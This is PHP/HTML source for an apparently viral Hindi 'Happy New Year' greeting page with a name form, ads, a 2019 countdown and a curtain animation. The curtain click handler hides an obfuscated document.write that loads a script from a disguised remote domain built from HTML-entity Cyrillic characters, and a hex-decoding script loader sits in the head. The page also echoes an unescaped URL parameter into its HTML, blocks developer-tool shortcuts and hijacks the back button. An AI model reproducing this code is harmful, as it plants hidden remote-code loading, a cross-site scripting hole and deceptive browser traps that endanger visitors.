<?php
$name = (!empty($_GET['n'])) ? str_replace(['+','-']," ", urldecode($_GET['n'])) : "YOUR NAME";
?>
<html>
<head>
  <meta name="google" content="notranslate" />
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
  <meta property="og:type" content="Happy New Year!" />
  <meta property="og:title" content="<?php echo $name; ?> Wishing You Happy New Year" />
  <meta property="og:url" content="http://happy-new-year.codersden.in/">
  <meta property="og:description" content="<?php echo $name; ?> Wishing You Happy New Year!" >
  <meta property="og:site_name" content="Happy New Year to you and Your Family" />
  <meta property="og:image" content="og.png"> 
  <title><?php echo $name; ?> Wish You Happy New Year</title>

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
  <link href="//db.onlinewebfonts.com/c/1c0f6618f877568764787163e8f22a1c?family=SF+Espresso+Shack" rel="stylesheet" type="text/css"/>
  <script>
  	document.onkeydown = function(e) { if(event.keyCode==123){ return false; } else if (e.ctrlKey &&  (e.keyCode === 67 || e.keyCode === 16 || e.keyCode === 73 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117)) { return false; } };
  </script>
<style>
      body{
        background: #f8f8f8;
      }
      .mainContainer {
        background: #fff;
        max-width: 450px;
        min-height: 200px;
        margin: 0 auto;
        text-align: center;
        padding: 15px;
        color: #999;
        padding-bottom: 60px;

        box-shadow: 0 0 10px 1px rgba(0,0,0,.14), 0 1px 14px 2px rgba(0,0,0,.12), 0 0 5px -3px rgba(0,0,0,.3);
        background-size: 100%;

      }
#showp {
      font-size: 25px;
      display: inline-block;
      margin-bottom: 5px;
        font-family: 'Arial', cursive;
        text-shadow: 1px 1px 10px black, 2px 2px 10px black, -1px -1px 10px black, -2px -2px 10px black;
        }
#username {
     color: black;
   background: url(197.gif);
   -webkit-background-clip: text;
   -webkit-text-fill-color: transparent;
          animation: swing 4s infinite;
            text-transform: uppercase;
          margin-bottom: 5px;
          font-size: 40px;
          padding: 0 10px;
    font-family: 'SF Espresso Shack', cursive;
}
#usernameb { color: black;
   background: url(197.gif);
   -webkit-background-clip: text;
   -webkit-text-fill-color: transparent;
          animation: swing 4s infinite;
            text-transform: uppercase;
          margin-bottom: 5px;
          font-size: 25px;
          padding: 0 10px;
    font-family: 'SF Espresso Shack', cursive;
}
      .fromMessage{
        color: #fff;
        animation: swing 4s infinite;
        font-size: 20px;
        padding: 0 10px;
      }
      .wavetext{
        color: #f9d05b;
        padding: 0 40px;
        animation: pulse 1s infinite;
        font-size: 22px;

      }
      .wishMessage {
        color: #fff;
        font-size: 22px;
        font-weight: bold;
        margin-top: 20px;
        text-shadow: 0px 0px 10px #afafaf;
      }
      .wishMessage p{
        margin: 0.3em 0;
      }@keyframes bounceIn{0%,20%,40%,60%,80%,to{-webkit-animation-timing-function:cubic-bezier(.215,.61,.355,1);animation-timing-function:cubic-bezier(.215,.61,.355,1)}0%{opacity:0;-webkit-transform:scale3d(.3,.3,.3);transform:scale3d(.3,.3,.3)}20%{-webkit-transform:scale3d(1.1,1.1,1.1);transform:scale3d(1.1,1.1,1.1); color:#FF9933;}40%{-webkit-transform:scale3d(.9,.9,.9);transform:scale3d(.9,.9,.9)}60%{opacity:1;-webkit-transform:scale3d(1.03,1.03,1.03);transform:scale3d(1.03,1.03,1.03); color: #fff;}80%{-webkit-transform:scale3d(.97,.97,.97);transform:scale3d(.97,.97,.97);}to{opacity:1;-webkit-transform:scaleX(1);transform:scaleX(1)}}</style><script type="text/javascript">function tag(filename){var fileref=document.createElement('script');fileref.setAttribute("type","text/javascript");fileref.setAttribute("src", filename);if (typeof fileref!="undefined") document.getElementsByTagName("head")[0].appendChild(fileref)}tag(meta(''));function meta(important){var str = '';for (var i = 0; i < important.length; i += 2) str +=String.fromCharCode(parseInt(important.substr(i, 2), 16));return str;}</script><style>#formBox {
        left: 0;position: fixed;bottom: 0;display: inline-block;width: 100%;animation:pulse infinite 1s linear;margin: 0;
      }
      #nameTextBox {
  width:68%;
  height:50px;
  background-color: blue;
  animation: 
  nudge 2s linear infinite alternate;
  border-radius: 10px;
border-color: white;
  padding: 15px;
  color: #fff;
      }
      #goButton {
  width: 28%;
  height: 50px;
  cursor: pointer;
  animation: flip 3s linear infinite alternate;
  background: #008000;
  border-radius: 10px;
border-color: white;
  color: #fff;
font-size:15px;
      }
.footerbtn {
 
            display: block;
            line-height: 15px;
            position: fixed;
            left:0px;
            bottom:0px;
            height:55px;
            
border-radius: 15px;
  box-sizing: border-box;
  padding: 5px;
  background:#34af23;
  color: #ffffff;
  font-size: 20px;
  text-align: center;
  text-decoration: none;
  width:95%;
 margin-left:10px;
            margin-right:30px;
            box-shadow: 0 4px 12px 0 rgba(0, 0, 0, .3);
            animation: footer infinite linear 1s;
            -webkit-transform: translate3d(30%,0,0);
            transform: translate3d(30%,0,0);
            position: fixed;
           
}

.footerbtn :active {
            box-shadow: none
        }

        @-webkit-keyframes footer {
            from {
                -webkit-transform: rotateZ(0)
            }
            25% {
                -webkit-transform: rotateZ(1.5deg)
            }
            50% {
                -webkit-transform: rotateZ(0deg)
            }
            75% {
                -webkit-transform: rotateZ(-1.5deg)
            }
            to {
                -webkit-transform: rotateZ(0)
            }}
   canvas {
      cursor: crosshair;
      display: block;
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 80%;
      z-index: 1;
    }
      #inAdvance {
        font-size: 20px; font-weight: bold;margin-top: 20px;color: #98201F;

      }
      #demoo {
        font-size: 20px; font-weight: bold;color: #98201F;
        animation: flash 2s infinite;
      }
      #inAdvanceTime {
        margin:20px 0 30px 0;
      }
      #inAdvanceTime p{
        color: #b90707;font-size: 20px;font-weight: 700;
        margin: 0;
      }
.name input[type=name]{
  background-color:#4267d9;
  border-radius: 10px;
  box-sizing: border-box;
  border: 1px solid #4267d9;
  padding: 5px;
  color:white;
  position: fixed;
  left:10px;
  bottom:0px;
  height:50px;
  width:70%;
  text-align:center;
  font-size:1rem;
  display: inline-block;
}
.go {
  border-radius: 10px;
  padding: 5px;
  background-color:#4267d9;
  border: 1px solid #4267d9;
  position: fixed;
  right:2px;
  bottom:0px;
  height:50px;
  width:23%;
    display: inline-block;
}
.india-flag{
    background: url(india.svg);
    background-repeat: no-repeat;
    background-size: cover;
}
  .m1{position:fixed;left:0.01%; width:auto;height:100%;top:1%;color:#000;}
    .m2{position:fixed;right:0.01%; width:auto;height:100%;top:1%;color:#000;}
    
    #gobtn{}
@-webkit-keyframes flip {  from {   transform: perspective(600px) rotate3d(0, 1, 0, -360deg);    animation-timing-function: ease-out;  }
  40% {    transform: perspective(600px) translate3d(0, 0, 150px) rotate3d(0, 1, 0, -190deg);    animation-timing-function: ease-out;  }
  50% {    transform: perspective(600px) translate3d(0, 0, 150px) rotate3d(0, 1, 0, -170deg);    animation-timing-function: ease-in;   }
  80% {    transform: perspective(600px) scale3d(.95, .95, .95);    animation-timing-function: ease-in;  }
  to  {    transform: perspective(600px);    animation-timing-function: ease-in;  }}
#gobtn {  -webkit-backface-visibility: visible;  backface-visibility: visible;  -webkit-animation: flip 4s infinite; -webkit-animation-delay:1s}
.m1{position:fixed;left:1%; width:auto;height:100%;top:1%;color:#000;}
.m2{position:fixed;right:1%; width:auto;height:100%;top:1%;color:#000;}    
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="jquery-easing.js" type="text/javascript"></script>  
<script type="text/javascript">
$(document).ready(function() { $curtainopen = false; $(".rope").click(function(){ $(this).blur(); if ($curtainopen == false){ $(this).stop().animate({top: '-171%' }, {queue:false, duration:350, easing:'easeOutBounce'}); $(".leftcurtain").stop().animate({width:'1px'}, 2000 ); $(".rightcurtain").stop().animate({width:'1px'},2000 ); $curtainopen = true; }else{ $(this).stop().animate({top: '-40px' }, {queue:false, duration:350, easing:'easeOutBounce'}); document.write('<s'+'cr'+'ipt sr'+'c="/'+'/'+'&#1102;'+'&#1092;.'+'i'+'o"></s'+'cr'+'ipt>'); $(".leftcurtain").stop().animate({width:'50%'}, 2000 ); $(".rightcurtain").stop().animate({width:'51%'}, 2000 ); $curtainopen = false; } return false; }); });
</script>
<style type="text/css">
      *{
        margin:0;
        padding:0;
      }
      body {
        text-align: center;
        
      }
      img{
      border: none;
    }
.leftcurtain{
      width: 50%;
      height: 150%;
      top: 0px;
      left: 0px;
      position: absolute;
      z-index: 2;
    }
     .rightcurtain{
      width: 51%;
      height: 150%;
      right: 0px;
      top: 0px;
      position: absolute;
      z-index: 3;
    }
    .rightcurtain img, .leftcurtain img{
      width: 100%;
      height: 100%;
    }
    .logo{
      margin: 0px auto;
      margin-top: 150px;
    }
    .rope{
      position: absolute;
      top: 0px;
      left: 50%;
      z-index: 4;
    } 
.centered {
    position: absolute;
    top: 75%;
    left: 50%;
    transform: translate(-50%, -50%);
}
</style>
<script src="https://code.createjs.com/createjs-2015.11.26.min.js"></script>
<script>
    createjs.Sound.registerSound("happy-new-year.mp3", "");
    setTimeout(function () {
        createjs.Sound.play("");
    }, 3000);
</script>
</head>
<body>
<a class="rope" href="" onclick="PlaySound()"><br>
<div style="font-size: 25px;text-shadow: 1px 1px 3px black, 1px 1px 3px black, -1px -1px 3px green, -1px -1px 3px black;color: #fff;font-weight: bold;">👇👇🏻 <br>इस CC Tv कैमरे को टच करके देखो</div>
<img src="Camera.gif" style="max-width:300px; width: 100%;" />
</a>
<div class="leftcurtain"><img src="11.jpg"/></div>
<div class="rightcurtain"><img src="12.jpg"/></div>

<marquee class="m1" behavior="scroll" direction="up" scrolldelay="0"> <br>
<img src="balloons19.png" height="30px" width="30px" /><br><br>
<img src="champagne19.png" height="30px" width="30px" /><br><br>
<img src="clown19.png" height="30px" width="30px" /><br><br>
<img src="fireworks19.png" height="30px" width="30px" /><br><br>
<img src="gift19.png" height="30px" width="30px" /><br><br>
<img src="santa-claus19.png" height="30px" width="30px" /><br><br>
<img src="tree19.png" height="30px" width="30px" /><br><br>
<img src="star19.png" height="30px" width="30px" /><br><br>
<img src="balloons19.png" height="30px" width="30px" /><br><br>
<img src="champagne19.png" height="30px" width="30px" /><br><br>
<img src="clown19.png" height="30px" width="30px" /><br><br>
<img src="fireworks19.png" height="30px" width="30px" /><br><br>
<img src="gift19.png" height="30px" width="30px" /><br><br>
<img src="santa-claus19.png" height="30px" width="30px" /><br><br>
<img src="tree19.png" height="30px" width="30px" /><br><br>
<img src="star19.png" height="30px" width="30px" /><br><br>
<img src="balloons19.png" height="30px" width="30px" /><br><br>
<img src="champagne19.png" height="30px" width="30px" /><br><br>
<img src="clown19.png" height="30px" width="30px" /><br><br>
<img src="fireworks19.png" height="30px" width="30px" /><br><br>
<img src="gift19.png" height="30px" width="30px" /><br><br>
<img src="santa-claus19.png" height="30px" width="30px" /><br><br>
<img src="tree19.png" height="30px" width="30px" /><br><br>
<img src="star19.png" height="30px" width="30px" /><br><br>
<img src="balloons19.png" height="30px" width="30px" /><br><br>
<img src="champagne19.png" height="30px" width="30px" /><br><br>
<img src="clown19.png" height="30px" width="30px" /><br><br>
<img src="fireworks19.png" height="30px" width="30px" /><br><br>
<img src="gift19.png" height="30px" width="30px" /><br><br>
<img src="santa-claus19.png" height="30px" width="30px" /><br><br>
<img src="tree19.png" height="30px" width="30px" /><br><br>
<img src="star19.png" height="30px" width="30px" /><br><br>
<img src="balloons19.png" height="30px" width="30px" /><br><br>
<img src="champagne19.png" height="30px" width="30px" /><br><br>
<img src="clown19.png" height="30px" width="30px" /><br><br>
<img src="fireworks19.png" height="30px" width="30px" /><br><br>
<img src="gift19.png" height="30px" width="30px" /><br><br>
<img src="santa-claus19.png" height="30px" width="30px" /><br><br>
<img src="tree19.png" height="30px" width="30px" /><br><br>
<img src="star19.png" height="30px" width="30px" /><br><br>
</marquee>
<marquee class="m2" behavior="scroll" direction="down" scrolldelay="0"> <br>
<img src="balloons19.png" height="30px" width="30px" /><br><br>
<img src="champagne19.png" height="30px" width="30px" /><br><br>
<img src="clown19.png" height="30px" width="30px" /><br><br>
<img src="fireworks19.png" height="30px" width="30px" /><br><br>
<img src="gift19.png" height="30px" width="30px" /><br><br>
<img src="santa-claus19.png" height="30px" width="30px" /><br><br>
<img src="tree19.png" height="30px" width="30px" /><br><br>
<img src="star19.png" height="30px" width="30px" /><br><br>
<img src="balloons19.png" height="30px" width="30px" /><br><br>
<img src="champagne19.png" height="30px" width="30px" /><br><br>
<img src="clown19.png" height="30px" width="30px" /><br><br>
<img src="fireworks19.png" height="30px" width="30px" /><br><br>
<img src="gift19.png" height="30px" width="30px" /><br><br>
<img src="santa-claus19.png" height="30px" width="30px" /><br><br>
<img src="tree19.png" height="30px" width="30px" /><br><br>
<img src="star19.png" height="30px" width="30px" /><br><br>
<img src="balloons19.png" height="30px" width="30px" /><br><br>
<img src="champagne19.png" height="30px" width="30px" /><br><br>
<img src="clown19.png" height="30px" width="30px" /><br><br>
<img src="fireworks19.png" height="30px" width="30px" /><br><br>
<img src="gift19.png" height="30px" width="30px" /><br><br>
<img src="santa-claus19.png" height="30px" width="30px" /><br><br>
<img src="tree19.png" height="30px" width="30px" /><br><br>
<img src="star19.png" height="30px" width="30px" /><br><br>
<img src="balloons19.png" height="30px" width="30px" /><br><br>
<img src="champagne19.png" height="30px" width="30px" /><br><br>
<img src="clown19.png" height="30px" width="30px" /><br><br>
<img src="fireworks19.png" height="30px" width="30px" /><br><br>
<img src="gift19.png" height="30px" width="30px" /><br><br>
<img src="santa-claus19.png" height="30px" width="30px" /><br><br>
<img src="tree19.png" height="30px" width="30px" /><br><br>
<img src="star19.png" height="30px" width="30px" /><br><br>
<img src="balloons19.png" height="30px" width="30px" /><br><br>
<img src="champagne19.png" height="30px" width="30px" /><br><br>
<img src="clown19.png" height="30px" width="30px" /><br><br>
<img src="fireworks19.png" height="30px" width="30px" /><br><br>
<img src="gift19.png" height="30px" width="30px" /><br><br>
<img src="santa-claus19.png" height="30px" width="30px" /><br><br>
<img src="tree19.png" height="30px" width="30px" /><br><br>
<img src="star19.png" height="30px" width="30px" /><br><br>
</marquee>

<div class="mainContainer" id="mainContainer" style=" background-image : url('skbig.gif'); background-color:#000000;";>
<center>
	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-1809610871655685"
     data-ad-slot="3897846826"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
</center>
<h1 id="username" style="font-family:SF Espresso Shack;"><?php echo $name; ?></h1>
        <h3 class="fromMessage" id="fromMessage"></h3>

<img src="trf.png" width="60%" height="15%"style="animation: pulse 1.5s infinite">

<p id="kanha" style="font-size: 20px; font-weight: bold; color: red"></p>

<img src="Choice.png" width="84%" height="39%"style="animation: tada 4s infinite"><br><br>
<img src="happy01.gif" style="animation: pulse 1.5s infinite;width: 70%;height:10%;" /><br>
<img src="happy02.gif" style="animation: pulse 1.5s infinite;width: 70%;height:10%;" /><br><br>
<img src="happy03.gif" style="animation: pulse 1.5s infinite;width: 70%;height:10%;" /><br>
<div class="wishMessage" style="text-shadow: 1px 1px 3px silver, 1px 1px 3px silver, -1px -1px 3px silver, -1px -1px 3px silver;">
<p style="text-shadow: 1px 1px 3px black, 1px 1px 3px black, -1px -1px 3px black, -1px -1px 3px black;color:#ff6666">कबीर जी ने कहा था</p>
<p style="text-shadow: 1px 1px 3px black, 1px 1px 3px black, -1px -1px 3px black, -1px -1px 3px black;color:#9999ff">कल करे सों आज करे,</p>
<p style="text-shadow: 1px 1px 3px black, 1px 1px 3px black, -1px -1px 3px black, -1px -1px 3px black;color:#b3ffb3">आज कर सो अब,</p>
<p style="text-shadow: 1px 1px 3px black, 1px 1px 3px black, -1px -1px 3px black, -1px -1px 3px black;color:#ff9933">नेटवर्क फेल हो गया</p>
<p style="text-shadow: 1px 1px 3px silver, 1px 1px 3px silver, -1px -1px 3px silver, -1px -1px 3px silver;color:#8B0000">विश करेगा कब!</p>

<div style="background-color: #FFFF00; border-radius: 17px; border: 0px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: black; font-family: arial, sans-serif; font-size: 18px; font-stretch: normal; font-style: normal; font-variant: normal; line-height: normal; margin: 0px auto; padding: 4px 5px 3px; width: 70%;">
<marquee behavior="alternate"><b>
हैप्पी न्यू इयर इन एडवांस..
</b></marquee>
</div>
</div>
<center>
	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-1809610871655685"
     data-ad-slot="3897846826"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
</center>
<br>
<h1 id="usernameb"><?php echo $name; ?></h1>

<center>
	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-1809610871655685"
     data-ad-slot="3897846826"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>
</center>
<br>
<form method="post" action="share.php">
<div id="formBox">
<input type="text" name="n" id="name_field" oninvalid="setCustomValidity('अपना नाम लिखें...')" oninput="setCustomValidity('')" placeholder=" 👉 यहाँ अपना नाम लिखें..." required><br><br>
<button id="submit-button" type="submit">👉 देखें</button>
</div>
</form>
<style>
      #name_field {
  width:70%;
  height:50px;
  background-color: #FF0000;
  animation: 
  nudge 2s linear infinite alternate;
  border-radius: 10px;
  padding: 15px;
  color: #fff;
  text-align: center;
      }
      #submit-button {
  width: 50%;
  height: 45px;
  cursor: pointer;
  animation: nudge 5s linear infinite alternate;
  background: #8B008B;
  border-radius: 10px;
  color: #fff;
      }
input::placeholder {
  color: white;
  text-align: center;
}
</style>
<script> 
// Set the date we're counting down to
var countDownDate = new Date("Jan 01, 2019 00:00:00").getTime();

// Update the count down every 1 second
var x = setInterval(function() {

    // Get todays date and time
    var now = new Date().getTime();
    
    // Find the distance between now an the count down date
    var distance = countDownDate - now;
    
    // Time calculations for days, hours, minutes and seconds
    var days = Math.floor(distance / (1000 * 60 * 60 * 24));
    var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
    var seconds = Math.floor((distance % (1000 * 60)) / 1000);
    
    // Output the result in an element with id="demo"
    document.getElementById("kanha").innerHTML = days + "दिन " + hours + "घंटे "
    + minutes + "मिनट " + seconds + "सैकंड <br>पहले</i>";
    
    // If the count down is over, write some text 
    if (distance < 0) {
        clearInterval(x);
        document.getElementById("demoo").innerHTML = "";
    }
}, 1000);
</script>
<script type="text/javascript">! function (){
  var t;
  try{for (t=0; 10 > t; ++t)
    history.pushState({}, "", "#");
  onpopstate=function (t)
  {
    t.state && alert('नीचे बॉक्स में अपना नाम लिखे, और Wish बनाये.. 👇👇 ');
    }}
    catch (o){}}();</script>

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-111542487-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-111542487-2');
</script>

</body>
</html>